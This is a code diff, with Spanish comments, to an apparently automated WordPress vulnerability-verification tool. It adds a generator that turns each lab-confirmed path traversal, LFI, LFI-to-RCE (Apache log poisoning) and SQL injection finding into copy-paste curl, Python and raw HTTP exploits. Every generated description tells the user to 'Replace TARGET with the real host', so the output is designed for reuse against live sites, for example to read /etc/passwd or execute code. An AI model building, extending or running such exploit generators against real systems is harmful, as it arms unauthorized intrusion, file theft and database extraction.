@@ -156,6 +156,8 @@ class WpVerifyResult:
     # causa, detail, diff_bytes}] — permite al motor y al analista saber EXACTAMENTE por qué
     # falló cada intento sin relanzar el ataque a mano.
     failure_trace: list = field(default_factory=list)
+    # PoC listo para copiar-pegar generado tras verified=True: {curl, python, http, description}
+    exploit_poc: dict = field(default_factory=dict)
 
 
 def _run(cmd: List[str], timeout: float = 60.0, input_text: str = None) -> subprocess.CompletedProcess:
@@ -229,6 +231,94 @@ def _quick_causa(body: str, status: int) -> str:
     if status == 500:
         return "error_500"
     return "unknown"
+
+
+def _build_exploit_poc(
+    base_url: str,
+    endpoint: str,
+    method: str,
+    params: dict,
+    headers: dict = None,
+    technique: str = "",
+    description: str = "",
+    json_body: bool = False,
+) -> dict:
+    """Genera un PoC copy-paste (curl + Python requests + HTTP raw) a partir del request
+    exacto que confirmó la vulnerabilidad en el lab. Reemplaza TARGET por la URL real del
+    objetivo cuando se reutiliza fuera del lab."""
+    import shlex as _shlex
+    import json as _json
+
+    full_url = base_url.rstrip("/") + "/" + endpoint.lstrip("/")
+    hdr = dict(headers or {})
+    m = (method or "GET").upper()
+
+    # ── curl ────────────────────────────────────────────────────────────────
+    curl_parts = ["curl", "-s", "-i"]
+    if m in ("POST", "PUT", "PATCH"):
+        curl_parts += ["-X", m]
+        if json_body:
+            curl_parts += ["-H", "Content-Type: application/json"]
+            curl_parts += ["-d", _json.dumps(params)]
+        else:
+            for k, v in params.items():
+                curl_parts += ["-d", f"{k}={v}"]
+    for hk, hv in hdr.items():
+        if hk.lower() not in ("content-type", "content-length"):
+            curl_parts += ["-H", f"{hk}: {hv}"]
+    curl_parts.append(_shlex.quote(full_url))
+    curl_cmd = " ".join(
+        p if p.startswith("-") or p == _shlex.quote(full_url) else _shlex.quote(p)
+        for p in curl_parts
+    )
+
+    # ── Python requests ─────────────────────────────────────────────────────
+    py_lines = ["import requests", "", f'TARGET = "{full_url}"', ""]
+    if hdr:
+        py_lines.append(f"headers = {_json.dumps(hdr, indent=4)}")
+    else:
+        py_lines.append("headers = {}")
+    if m in ("POST", "PUT", "PATCH"):
+        py_lines.append(f"data = {_json.dumps(params, indent=4)}")
+        if json_body:
+            py_lines.append(f'r = requests.{m.lower()}(TARGET, json=data, headers=headers, verify=False)')
+        else:
+            py_lines.append(f'r = requests.{m.lower()}(TARGET, data=data, headers=headers, verify=False)')
+    else:
+        py_lines.append(f"params = {_json.dumps(params, indent=4)}")
+        py_lines.append(f'r = requests.get(TARGET, params=params, headers=headers, verify=False)')
+    py_lines += ["print(r.status_code)", "print(r.text[:500])"]
+    python_script = "\n".join(py_lines)
+
+    # ── Raw HTTP ────────────────────────────────────────────────────────────
+    path = endpoint if endpoint.startswith("/") else "/" + endpoint
+    if m in ("POST", "PUT", "PATCH"):
+        if json_body:
+            body_str = _json.dumps(params)
+            ct = "application/json"
+        else:
+            body_str = "&".join(f"{k}={v}" for k, v in params.items())
+            ct = "application/x-www-form-urlencoded"
+        http_lines = [
+            f"{m} {path} HTTP/1.1",
+            "Host: TARGET",
+            f"Content-Type: {ct}",
+            f"Content-Length: {len(body_str.encode())}",
+            "",
+            body_str,
+        ]
+    else:
+        qs = "&".join(f"{k}={v}" for k, v in params.items())
+        path_qs = f"{path}?{qs}" if qs else path
+        http_lines = [f"GET {path_qs} HTTP/1.1", "Host: TARGET", ""]
+
+    return {
+        "curl": curl_cmd,
+        "python": python_script,
+        "http": "\n".join(http_lines),
+        "description": description or f"{technique} confirmed on {endpoint}",
+        "technique": technique,
+    }
 
 
 def _list_real_page_urls(lab, limit: int = 12) -> list:
@@ -3423,9 +3513,19 @@ def verify_wordpress_path_traversal(
                           f"(el canario propio no se confirmo, pero /etc/passwd -- el objetivo "
                           f"exacto del PoC publico -- si; el traversal es real, algo especifico "
                           f"del canario/su ruta lo bloqueaba)")
+            _pt_params = dict(base_params); _pt_params[path_param] = res.evidence["payload_ganador"]
+            res.exploit_poc = _build_exploit_poc(
+                base_url=boot.base_url, endpoint=endpoint, method=m,
+                params=_pt_params, technique="path-traversal",
+                description=f"Path traversal on '{path_param}': /etc/passwd returned in response. Replace TARGET with the real host.")
         elif found:
             res.verified = True
             res.ok = True
+            _pt_params = dict(base_params); _pt_params[path_param] = res.evidence["payload_ganador"]
+            res.exploit_poc = _build_exploit_poc(
+                base_url=boot.base_url, endpoint=endpoint, method=m,
+                params=_pt_params, technique="path-traversal",
+                description=f"Path traversal on '{path_param}': secret file content leaked. Replace TARGET with the real host.")
             _used_canary = (php_canary_path if (php_secret and php_secret in
                             (res.evidence.get("respuesta_cuerpo_recorte") or ""))
                            else canary_path)
@@ -3748,6 +3848,7 @@ def verify_wordpress_lfi(
             res.evidence["lfi_rce_intentos"] = rce_tried
 
         # ── veredicto ────────────────────────────────────────────────────
+        _lfi_base_params = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
         if rce_found:
             res.verified = True
             res.ok = True
@@ -3757,6 +3858,11 @@ def verify_wordpress_lfi(
                 f"{res.evidence['lfi_rce_payload']!r} el codigo SE EJECUTO de verdad "
                 f"(el marcador aparecio sin etiquetas PHP) -- ejecucion remota de codigo "
                 f"a partir de un Local File Inclusion")
+            _lfi_poc_params = dict(_lfi_base_params); _lfi_poc_params[path_param] = res.evidence["lfi_rce_payload"]
+            res.exploit_poc = _build_exploit_poc(
+                base_url=boot.base_url, endpoint=endpoint, method=m,
+                params=_lfi_poc_params, technique="LFI-to-RCE (log poisoning)",
+                description=f"LFI-to-RCE on '{path_param}': Apache log poisoned with PHP, then included via LFI to execute code. Replace TARGET with the real host.")
         elif php_canary_found:
             res.verified = True
             res.ok = True
@@ -3766,6 +3872,11 @@ def verify_wordpress_lfi(
                 f"canario PHP plantado en /tmp/ (secreto encontrado en la respuesta) -- "
                 f"el plugin hace require_once/include con sufijo .php hardcoded, "
                 f"permitiendo traversal de directorios")
+            _lfi_poc_params = dict(_lfi_base_params); _lfi_poc_params[path_param] = res.evidence["lfi_php_canary_payload"]
+            res.exploit_poc = _build_exploit_poc(
+                base_url=boot.base_url, endpoint=endpoint, method=m,
+                params=_lfi_poc_params, technique="PHP-include LFI",
+                description=f"PHP-include LFI on '{path_param}': path traversal reaches /tmp/ — plugin appends .php suffix. Replace TARGET with the real host.")
         elif read_found:
             res.verified = True
             res.ok = True
@@ -3775,6 +3886,11 @@ def verify_wordpress_lfi(
                 f"contenido de '{res.evidence['lfi_lectura_fichero']}' en la respuesta "
                 f"(patron encontrado) -- lectura de ficheros del servidor; "
                 f"RCE via log poisoning no se confirmo en este entorno")
+            _lfi_poc_params = dict(_lfi_base_params); _lfi_poc_params[path_param] = res.evidence["lfi_lectura_payload"]
+            res.exploit_poc = _build_exploit_poc(
+                base_url=boot.base_url, endpoint=endpoint, method=m,
+                params=_lfi_poc_params, technique="LFI read",
+                description=f"LFI read on '{path_param}': {res.evidence.get('lfi_lectura_fichero','file')} contents leaked. Replace TARGET with the real host.")
         else:
             res.ok = True
             res.detail = (
@@ -5215,6 +5331,11 @@ def verify_wordpress_sqli(
                           f"dato real forzado a salir en un mensaje de error, no una coincidencia")
             step(f"VERIFICADO (error-based): version real del motor filtrada en el mensaje de "
                  f"error: {mysql_version}")
+            _poc_params = dict(base_params); _poc_params[sqli_param] = payload_val
+            res.exploit_poc = _build_exploit_poc(
+                base_url=boot.base_url, endpoint=endpoint, method=m,
+                params=_poc_params, json_body=json_body, technique="error-based SQLi",
+                description=f"Error-based SQLi on '{sqli_param}': MySQL {mysql_version} leaked via extractvalue(). Replace TARGET with the real host.")
             if m == "GET":
                 shot_url = (boot.base_url + endpoint + ("&" if "?" in endpoint else "?")
                            + f"{sqli_param}={payload_val}")
@@ -5289,6 +5410,11 @@ def verify_wordpress_sqli(
                           f"de contenido")
             step(f"VERIFICADO (UNION-based): version real del motor filtrada en la respuesta: "
                  f"{mysql_version}")
+            _poc_params = dict(base_params); _poc_params[sqli_param] = payload_val
+            res.exploit_poc = _build_exploit_poc(
+                base_url=boot.base_url, endpoint=endpoint, method=m,
+                params=_poc_params, json_body=json_body, technique="UNION-based SQLi",
+                description=f"UNION-based SQLi on '{sqli_param}': MySQL {mysql_version} extracted via UNION SELECT. Replace TARGET with the real host.")
             if m == "GET":
                 shot_url = (boot.base_url + endpoint + ("&" if "?" in endpoint else "?")
                            + f"{sqli_param}={payload_val}")
@@ -5355,6 +5481,12 @@ def verify_wordpress_sqli(
                           f"(menos duro que el UNION/error-based)")
             step(f"VERIFICADO (boolean-blind): {consistent_diffs}/{len(pairs)} pares mostraron "
                  f"diferencia consistente")
+            _bool_winning = next((e["true"] for e in bool_tried if e.get("difiere") and e.get("true_coincide_con_base")), pairs[0][0])
+            _poc_params = dict(base_params); _poc_params[sqli_param] = _bool_winning
+            res.exploit_poc = _build_exploit_poc(
+                base_url=boot.base_url, endpoint=endpoint, method=m,
+                params=_poc_params, json_body=json_body, technique="boolean-blind SQLi",
+                description=f"Boolean-blind SQLi on '{sqli_param}': TRUE condition returns different response size than FALSE. Replace TARGET with the real host.")
             res.evidence["screenshots"] = boot.shots
             return res
 
@@ -5461,6 +5593,12 @@ def verify_wordpress_sqli(
                               f"pequeño fragmento variable)")
                 step(f"VERIFICADO (boolean-blind content-diff): {_content_consistent} pares "
                      f"con tokens exclusivos TRUE≠FALSE")
+                _cdiff_true_p = (_content_trigger_pair or {}).get("true", pairs[0][0]) if bool_tried else pairs[0][0]
+                _poc_params = dict(base_params); _poc_params[sqli_param] = _cdiff_true_p
+                res.exploit_poc = _build_exploit_poc(
+                    base_url=boot.base_url, endpoint=endpoint, method=m,
+                    params=_poc_params, json_body=json_body, technique="boolean-blind SQLi (content-diff)",
+                    description=f"Boolean-blind SQLi on '{sqli_param}': response body differs by exclusive tokens between TRUE/FALSE conditions. Replace TARGET with the real host.")
                 res.evidence["screenshots"] = boot.shots
                 return res
 
@@ -5564,6 +5702,12 @@ def verify_wordpress_sqli(
                           f"ninguna diferencia visible en el contenido de la respuesta")
             step(f"VERIFICADO (time-based blind): {timing_consistent}/{len(timing_pairs)} pares "
                  f"mostraron retraso consistente")
+            _tbwin = next((t["slow"] for t in timing_tried if t.get("retraso_consistente")), timing_pairs[0][0])
+            _poc_params = dict(base_params); _poc_params[sqli_param] = _tbwin
+            res.exploit_poc = _build_exploit_poc(
+                base_url=boot.base_url, endpoint=endpoint, method=m,
+                params=_poc_params, json_body=json_body, technique="time-based blind SQLi",
+                description=f"Time-based blind SQLi on '{sqli_param}': SLEEP(5) causes ≥3.5s delay vs SLEEP(0). Replace TARGET with the real host and add auth cookie if needed.")
         else:
             _max_single_delay_local = max(_slow_times) if _slow_times else 0.0
             step(f"[técnica time-based blind] FALLO: {timing_consistent}/{len(timing_pairs)} "
